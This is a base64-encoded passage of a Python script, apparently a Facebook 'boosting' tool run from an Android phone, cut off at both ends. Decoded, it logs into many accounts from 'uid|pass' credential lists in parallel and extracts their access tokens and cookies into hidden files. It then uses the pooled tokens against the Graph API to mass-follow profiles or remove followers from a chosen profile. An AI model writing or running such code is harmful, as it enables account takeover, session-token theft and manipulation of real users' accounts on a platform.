b3VudHMgZm91bmQgaW4ge2FjY291bnRzX2ZpbGV9LiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB3aXRoIHRocmVhZC5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVzID0gW2V4ZWN1dG9yLnN1Ym1pdChiZ3JhcGhfcGFnZSwgdWlkLCBwdywgdG9rZW5fb3V0cHV0X3BhdGgsIGV4dHJhY3RfdHlwZSwgc3VjY2Vzc19jb3VudCwgZXhpc3RpbmdfdG9rZW5zKQogICAgICAgICAgICAgICAgICAgICAgIGZvciB1aWQsIHB3IGluIFthY2NvdW50LnNwbGl0KCd8JykgZm9yIGFjY291bnQgaW4gYWNjb3VudHNdXQoKICAgICAgICAgICAgZm9yIGZ1dHVyZSBpbiBmdXR1cmVzOgogICAgICAgICAgICAgICAgZnV0dXJlLnJlc3VsdCgpCgogICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcHJpbnQoZiIgICAgIFwwMzNbMTszNG1bU1VDQ0VTU11cMDMzWzBtOiB7bGVuKHN1Y2Nlc3NfY291bnQpfSB7ZXh0cmFjdF90eXBlfShzKSBzdWNjZXNzZnVsbHkgZXh0cmFjdGVkLiIpCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoZiJGaWxlIG5vdCBmb3VuZDoge2FjY291bnRzX2ZpbGV9IikKZGVmIGV4dHJhY3Rpb24oKToKCiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgcHJpbnQoZiIgICAgIHt3aGl0ZX1bMV0ge3llbGxvd31FWFRSQUNUIHtyZWR9QUNDT1VOVCIpCiAgICBwcmludChmIiAgICAge3doaXRlfVsyXSB7eWVsbG93fUVYVFJBQ1Qge3JlZH1QQUdFUyIpCiAgICBwcmludCgiICAgICBcMDMzWzE7MzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBjaG9pY2UgPSBpbnB1dChmIiAgICAge2dyZWVufUNIT0lDRTogIikuc3RyaXAoKSAKICAgIGlmIGNob2ljZSA9PSAnMSc6CiAgICAgICAgYXhsMSgpCiAgICBlbGlmIGNob2ljZSA9PSAnMic6CiAgICAgICAgYXhsMigpCiAgICBlbHNlOgogICAgICAgIHByaW50KGYiICAgICB7cmVkfUlOVkFMSUQgQ0hPSUNFIikKZGVmIGF4bDIoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBmb2xkZXJfcGF0aCA9ICIvc2RjYXJkL2Jvb3N0cGhlcmUiICAKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDFdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgQUNDT1VOVCIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDJdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgUEFHRVMiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAzXSBcMDMzWzMybVJQVyBFWFRSQUNUIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzA0XSBcMDMzWzMybVJQVyBFWFRSQUNUIFBBR0VTIikKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBzYXZlX2Nob2ljZSA9IGlucHV0KGYiICAgICBcMDMzWzMybUNIT0lDRTogIikuc3RyaXAoKQoKICAgIGlmIHNhdmVfY2hvaWNlID09ICcxJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFBQ0NPVU5ULnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ2FjY291bnQnCiAgICBlbGlmIHNhdmVfY2hvaWNlID09ICcyJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFQQUdFUy50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdwYWdlJwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnMyc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXQUNDT1VOVC50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdhY2NvdW50JwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnNCc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXUEFHRVMudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAncGFnZScKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiBFeGl0aW5nLiIpCiAgICAgICAgcmV0dXJuCgogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHByaW50KGYiICAgICBcMDMzWzMzbVRIRSBGT1JNQVQgU0hPVUxEIEJFIFwwMzNbMzFtdWlkfHBhc3MiKQogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGZpbGVfcGF0aCA9IGlucHV0KGYiICAgICBcMDMzWzMzbVBBVEg6ICIpLnN0cmlwKCkKCiAgICBwcm96YyhmaWxlX3BhdGgsIGFjY291bnRfZmlsZSwgZXh0cmFjdF90eXBlKQpkZWYgYXhsMSgpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIGZvbGRlcl9wYXRoID0gIi9zZGNhcmQvYm9vc3RwaGVyZSIKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDFdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgQUNDT1VOVCIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDJdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgUEFHRVMiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAzXSBcMDMzWzMybVJQVyBFWFRSQUNUIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzA0XSBcMDMzWzMybVJQVyBFWFRSQUNUIFBBR0VTIikKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBzYXZlX2Nob2ljZSA9IGlucHV0KGYiICAgICBcMDMzWzMybUNIT0lDRTogIikuc3RyaXAoKQoKICAgIGlmIHNhdmVfY2hvaWNlID09ICcxJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFBQ0NPVU5ULnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ2FjY291bnQnCiAgICBlbGlmIHNhdmVfY2hvaWNlID09ICcyJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFQQUdFUy50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdwYWdlJwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnMyc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXQUNDT1VOVC50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdhY2NvdW50JwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnNCc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXUEFHRVMudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAncGFnZScKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiBFeGl0aW5nLiIpCiAgICAgICAgcmV0dXJuCgogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHByaW50KGYiICAgICBcMDMzWzMzbVRIRSBGT1JNQVQgU0hPVUxEIEJFIFwwMzNbMzFtdWlkfHBhc3MiKQogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGZpbGVfcGF0aCA9IGlucHV0KGYiICAgICBcMDMzWzMzbVBBVEg6ICIpLnN0cmlwKCkKCiAgICB0b2tlbl9vdXRwdXRfcGF0aCA9IGFjY291bnRfZmlsZQoKICAgIHByb3ooZmlsZV9wYXRoLCB0b2tlbl9vdXRwdXRfcGF0aCwgZXh0cmFjdF90eXBlKQoKZGVmIGNvb2tpZV90b2tlbigpOgogICAgY2xlYXIoKQogICAgbG9nbygpCiAgICBlbWFpbCA9IGlucHV0KCJFTUFJTCA6ICIpCiAgICBwYXNzd29yZCA9IGlucHV0KCJQQVNTV09SRCA6ICIpIAogICAgbGluZXgoKQogICAgCiAgICAjIENvcnJlY3QgZnVuY3Rpb24gY2FsbCwgZW5zdXJpbmcgYm90aCB2YWx1ZXMgYXJlIHJldHJpZXZlZAogICAgY29va2llLCB0b2tlbiA9IG5hcnV0byhlbWFpbCwgcGFzc3dvcmQpCgogICAgaWYgY29va2llOgogICAgICAgIHByaW50KGYie2dyZWVufUFDQ0VTUyBUT0tFTjoge3Rva2VufSIpCiAgICAgICAgbGluZXgoKQogICAgICAgIHByaW50KGYie2dyZWVufUNPT0tJRToge2Nvb2tpZX0iKQogICAgZWxzZToKICAgICAgICBwcmludChmIntyZWR9RkFJTEVEIFRPIE9CVEFJTiBDT09LSUUgQU5EIEFDQ0VTUyBUT0tFTi4iKQogICAgICAgIAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcwoKIyBQbGFjZWhvbGRlciBmdW5jdGlvbnMgKFlvdSBuZWVkIHRvIGRlZmluZSB0aGVzZSkKZGVmIGNsZWFyKCk6CiAgICBwYXNzCgpkZWYgbG9nbygpOgogICAgcGFzcwoKZGVmIGdldF9pZHNfdG9rZW5zKGZpbGVfcGF0aCk6CiAgICAiIiIgUmVhZHMgYWNjZXNzIHRva2VucyBmcm9tIGEgZmlsZS4gIiIiCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmOgogICAgICAgICAgICByZXR1cm4gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBmLnJlYWRsaW5lcygpXQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KCJFcnJvcjogVG9rZW4gZmlsZSBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4gW10KCmRlZiBnZXRfcHJvZmlsZV9pZCh1c2VybmFtZSwgYWNjZXNzX3Rva2VuKToKICAgICIiIiBHZXRzIHRoZSBwcm9maWxlIElEIGZyb20gdXNlcm5hbWUuICIiIgogICAgdXJsID0gZiJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTkuMC97dXNlcm5hbWV9IgogICAgcGFyYW1zID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW59CiAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIHBhcmFtcz1wYXJhbXMpCiAgICBkYXRhID0gcmVzcG9uc2UuanNvbigpCiAgICByZXR1cm4gZGF0YS5nZXQoJ2lkJywgTm9uZSkKCmRlZiBnZXRfcHJvZmlsZV91c2VybmFtZShwcm9maWxlX2lkLCBhY2Nlc3NfdG9rZW4pOgogICAgIiIiIEdldHMgdGhlIHByb2ZpbGUgdXNlcm5hbWUgZnJvbSBJRC4gIiIiCiAgICB1cmwgPSBmImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxOS4wL3twcm9maWxlX2lkfSIKICAgIHBhcmFtcyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnZmllbGRzJzogJ25hbWUnfQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBwYXJhbXM9cGFyYW1zKQogICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgcmV0dXJuIGRhdGEuZ2V0KCduYW1lJywgJ1Vua25vd24nKQoKZGVmIHJlbW92ZV9mYWNlYm9va19mb2xsb3dlcigpOgogICAgY2xlYXIoKQogICAgbG9nbygpCiAgICAKICAgIGFjY2Vzc190b2tlbnMgPSBnZXRfaWRzX3Rva2VucygnL3NkY2FyZC9FUlJPUi1CT09TVElORy90b2twLnR4dCcpCiAgICBpZiBub3QgYWNjZXNzX3Rva2VuczoKICAgICAgICBwcmludCgiTm8gYWNjZXNzIHRva2VucyBmb3VuZC4iKQogICAgICAgIHJldHVybgoKICAgIHByb2ZpbGVfbGluayA9IGlucHV0KCdFTlRFUiBUSEUgRkFDRUJPT0sgUFJPRklMRSBMSU5LIFRPIFJFTU9WRSBGT0xMT1dFUlMgRlJPTTogJykuc3RyaXAoKQogICAgdXNlcm5hbWUgPSBwcm9maWxlX2xpbmsuc3BsaXQoJy8nKVstMV0KICAgIHByb2ZpbGVfaWQgPSBnZXRfcHJvZmlsZV9pZCh1c2VybmFtZSwgYWNjZXNzX3Rva2Vuc1swXSkKCiAgICBpZiBub3QgcHJvZmlsZV9pZDoKICAgICAgICBwcmludCgiRXJyb3I6IENvdWxkIG5vdCByZXRyaWV2ZSBwcm9maWxlIElELiBDaGVjayB0aGUgcHJvZmlsZSBsaW5rLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIG51bV90b19yZW1vdmUgPSBpbnQoaW5wdXQoJ0hPVyBNQU5ZIEZPTExPV0VSUyBETyBZT1UgV0FOVCBUTyBSRU1PVkU/ICcpKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIkludmFsaWQgaW5wdXQuIFBsZWFzZSBlbnRlciBhIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgIGRlZiByZW1vdmVfZm9sbG93ZXIoZm9sbG93ZXJfaWQsIGFjY2Vzc190b2tlbik6CiAgICAgICAgIiIiIFJlbW92ZXMgYSBzcGVjaWZpYyBmb2xsb3dlci4gIiIiCiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSBmImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxOS4wL3tmb2xsb3dlcl9pZH0iCiAgICAgICAgICAgIHBhcmFtcyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VufQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmRlbGV0ZSh1cmwsIHBhcmFtcz1wYXJhbXMpCiAgICAgICAgICAgIHJldHVybiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDAKICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uOgogICAgICAgICAgICByZXR1cm4gRmFsc2UKCiAgICBkZWYgaGFuZGxlX3JlbW92aW5nKGFjY2Vzc190b2tlbik6CiAgICAgICAgIiIiIEhhbmRsZXMgdGhlIHJlbW92YWwgb2YgZm9sbG93ZXJzIHVzaW5nIGEgdG9rZW4uICIiIgogICAgICAgIG5vbmxvY2FsIHJlbW92ZV9jb3VudAogICAgICAgIGlmIHJlbW92ZV9jb3VudCA+PSBudW1fdG9fcmVtb3ZlOgogICAgICAgICAgICByZXR1cm4KICAgICAgICAKICAgICAgICBwcm9maWxlX25hbWUgPSBnZXRfcHJvZmlsZV91c2VybmFtZShwcm9maWxlX2lkLCBhY2Nlc3NfdG9rZW4pCiAgICAgICAgCiAgICAgICAgZm9sbG93ZXJzX3VybCA9IGYiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE5LjAve3Byb2ZpbGVfaWR9L3N1YnNjcmliZXJzIgogICAgICAgIHBhcmFtcyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VufQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGZvbGxvd2Vyc191cmwsIHBhcmFtcz1wYXJhbXMpCgogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlICE9IDIwMDoKICAgICAgICAgICAgcHJpbnQoZiJFcnJvciBmZXRjaGluZyBmb2xsb3dlcnMgZm9yIHtwcm9maWxlX25hbWV9LiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICBkYXRhID0gcmVzcG9uc2UuanNvbigpCiAgICAgICAgZm9sbG93ZXJzID0gZGF0YS5nZXQoJ2RhdGEnLCBbXSkKCiAgICAgICAgZm9yIGZvbGxvd2VyIGluIGZvbGxvd2VyczoKICAgICAgICAgICAgaWYgcmVtb3ZlX2NvdW50ID49IG51bV90b19yZW1vdmU6CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBmb2xsb3dlcl9pZCA9IGZvbGxvd2VyLmdldCgnaWQnKQogICAgICAgICAgICBpZiBmb2xsb3dlcl9pZCBhbmQgcmVtb3ZlX2ZvbGxvd2VyKGZvbGxvd2VyX2lkLCBhY2Nlc3NfdG9rZW4pOgogICAgICAgICAgICAgICAgcHJpbnQoZiJTVUNDRVNTOiBSZW1vdmVkIGZvbGxvd2VyIHtmb2xsb3dlcl9pZH0gZnJvbSB7cHJvZmlsZV9uYW1lfS4iKQogICAgICAgICAgICAgICAgcmVtb3ZlX2NvdW50ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYiRkFJTEVEOiBDb3VsZCBub3QgcmVtb3ZlIGZvbGxvd2VyIHtmb2xsb3dlcl9pZH0gZnJvbSB7cHJvZmlsZV9uYW1lfS4iKQoKICAgIHJlbW92ZV9jb3VudCA9IDAKCiAgICB3aXRoIGNvbmN1cnJlbnQuZnV0dXJlcy5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MSkgYXMgZXhlY3V0b3I6CiAgICAgICAgZnV0dXJlcyA9IFtleGVjdXRvci5zdWJtaXQoaGFuZGxlX3JlbW92aW5nLCB0b2tlbikgZm9yIHRva2VuIGluIGFjY2Vzc190b2tlbnMgaWYgcmVtb3ZlX2NvdW50IDwgbnVtX3RvX3JlbW92ZV0KICAgICAgICBjb25jdXJyZW50LmZ1dHVyZXMud2FpdChmdXR1cmVzKQoKICAgIHByaW50KGYiU1VDQ0VTU0ZVTExZIFJFTU9WRUQge3JlbW92ZV9jb3VudH0gZm9sbG93ZXJzIG91dCBvZiB7bnVtX3RvX3JlbW92ZX0gcmVxdWVzdGVkLiIpCgpkZWYgZm9sbG93KCk6CiAgICBjbGVhcigpCiAgICBsb2dvKCkKICAgIHByaW50KCJbMV0gRk9MTE9XIEEgRkFDRUJPT0sgUFJPRklMRS9QQUdFIikKICAgIHByaW50KCJbMl0gUkVNT1ZFIEZPTExPV0VSUyBGUk9NIEEgRkFDRUJPT0sgUFJPRklMRS9QQUdFIikKICAgIHByaW50KCJbM10gRVhJVCIpCiAgICAKICAgIGNob2ljZSA9IGlucHV0KCdDSE9PU0U6ICcpLnN0cmlwKCkKICAgIAogICAgaWYgY2hvaWNlID09ICcxJzoKICAgICAgICBmb2xsb3dfZmFjZWJvb2soKSAgIyBUaGlzIGZ1bmN0aW9uIHNob3VsZCBiZSBkZWZpbmVkCiAgICBlbGlmIGNob2ljZSA9PSAnMic6CiAgICAgICAgcmVtb3ZlX2ZhY2Vib29rX2ZvbGxvd2VyKCkKICAgIGVsaWYgY2hvaWNlID09ICczJzoKICAgICAgICBleGl0KCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIklOVkFMSUQgT1BUSU9OLiIpCiAgICAgICAgZm9sbG93KCkKZGVmIHVwZGF0ZSgpOgogICAgY2xlYXIoKQogICAgbG9nbygpCiAgICBtYWluX3JlcG9fcGF0aCA9ICcuJwogICAgYm9vc3RpbmdfcmVwb19wYXRoID0gJy4vQk9PU1RJTkcnCiAgICB0cnk6CiAgICAgICAgcHJpbnQoZiJ7Z3JlZW59VVBEQVRJTkcgVEhFIE1BSU4gUkVQT1NJVE9SWS4uLiIpCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydnaXQnLCAncHVsbCddLCBjd2Q9bWFpbl9yZXBvX3BhdGgsIGNoZWNrPVRydWUpCiAgICAgICAgcHJpbnQoZiJ7d2hpdGV9TUFJTiBSRVBPU0lUT1JZIFVQREFURUQgU1VDQ0VTU0ZVTExZLiIpCiAgICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3IgYXMgZToKICAgICAgICBwcmludChmIntyZWR9RVJST1IgT0NDVVJSRUQgV0hJTEUgVVBEQVRJTkcgVEhFIE1BSU4gUkVQT1NJVE9SWToge2V9IikKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhib29zdGluZ19yZXBvX3BhdGgpOgogICAgICAgIHByaW50KGYie3JlZH1CT09TVElORyBSRVBPU0lUT1JZIE5PVCBGT1VORCBMT0NBTExZLiBQTEVBU0UgQ0xPTkUgSVQgRklSU1QuIikKICAgICAgICByZXR1cm4KICAgIHRyeToKICAgICAgICBwcmludChmIntncmVlbn1QVUxMSU5HIFRIRSBMQVRFU1QgQ0hBTkdFUyBGUk9NIFRIRSBCT09TVElORyBSRVBPU0lUT1JZLi4uIikKICAgICAgICBzdWJwcm9jZXNzLnJ1bihbJ2dpdCcsICdwdWxsJ10sIGN3ZD1ib29zdGluZ19yZXBvX3BhdGgsIGNoZWNrPVRydWUpCiAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Qk9PU1RJTkcgUkVQT1NJVE9SWSBVUERBVEVEIFNVQ0NFU1NGVUxMWS4iKQogICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yIGFzIGU6CiAgICAgICAgcHJpbnQoZiJ7cmVkfUVSUk9SIE9DQ1VSUkVEIFdISUxFIFVQREFUSU5HIFRIRSBCT09TVElORyBSRVBPU0lUT1JZOiB7ZX0iKQogICAgICAgCmRlZiBmb2xsb3coKToKICAgIGNsZWFyKCkKICAgIGxvZ28oKQogICAgcHJpbnQoZicnJ3t3aGl0ZX0gIENIT09TRSBGQUNFQk9PSyBUTyBGT0xMT1c6JycnKQogICAgcHJpbnQoZicnJ3t5ZWxsb3d9ICBbMV0ge2JsdWV9WU9VUiBGUkEgTElTVCcnJykKICAgIHByaW50KGYnJyd7eWVsbG93fSAgWzJdIHtibHVlfVlPVVIgUlBBIExJU1QnJycpCiAgICBwcmludChmJycne3llbGxvd30gIFszXSB7Ymx1ZX1ZT1VSIEZSQSBQQUdFUyBMSVNUJycnKQogICAgcHJpbnQoZicnJ3t5ZWxsb3d9ICBbNF0ge2JsdWV9WU9VUiBSUEEgUEFHRVMgTElTVCcnJykKICAgIHByaW50KGYnJyd7cmVkfSAgWzBdIHtyZWR9UkVUVVJOIFRPIE1BSU4gTUVOVScnJykKICAgIGxpbmUoKQogICAgYWNjb3VudF9jaG9vc2UgPSBpbnB1dChmJycne3llbGxvd30gIENob29zZSA6IHtncmVlbn0nJycpCiAgICBsaW5lKCkKICAgIGlmIGFjY291bnRfY2hvb3NlID09ICcxJyBvciBhY2NvdW50X2Nob29zZSA9PSAnMDEnOgogICAgICAgIGZpbGVfcGF0aCA9ICcvc2RjYXJkLy5FWFRSQUNULVRPS0VOLUZSQS1BQ0NPVU5ULnR4dCcKICAgIGVsaWYgYWNjb3VudF9jaG9vc2UgPT0gJzInIG9yIGFjY291bnRfY2hvb3NlID09ICcwMic6CiAgICAgICAgZmlsZV9wYXRoID0gJy9zZGNhcmQvLkVYVFJBQ1QtVE9LRU4tUlAtQUNDT1VOVC50eHQnCiAgICBlbGlmIGFjY291bnRfY2hvb3NlID09ICczJyBvciBhY2NvdW50X2Nob29zZSA9PSAnMDMnOgogICAgICAgIGZpbGVfcGF0aCA9ICcvc2RjYXJkLy5FWFRSQUNULVRPS0VOLUZSQS1QQUdFUy50eHQnCiAgICBlbGlmIGFjY291bnRfY2hvb3NlID09ICc0JyBvciBhY2NvdW50X2Nob29zZSA9PSAnMDQnOgogICAgICAgIGZpbGVfcGF0aCA9ICcvc2RjYXJkLy5FWFRSQUNULVRPS0VOLVJQLVBBR0VTLnR4dCcKICAgIGVsaWYgYWNjb3VudF9jaG9vc2UgPT0gJzAnIG9yIGFjY291bnRfY2hvb3NlID09ICcwMCc6CiAgICAgICAgbWFpbigpCiAgICAgICAgcmV0dXJuCiAgICBhY2Nlc3NfdG9rZW5zID0gZ2V0X2FjY2Vzc190b2tlbl9mcm9tX2ZpbGUoZmlsZV9wYX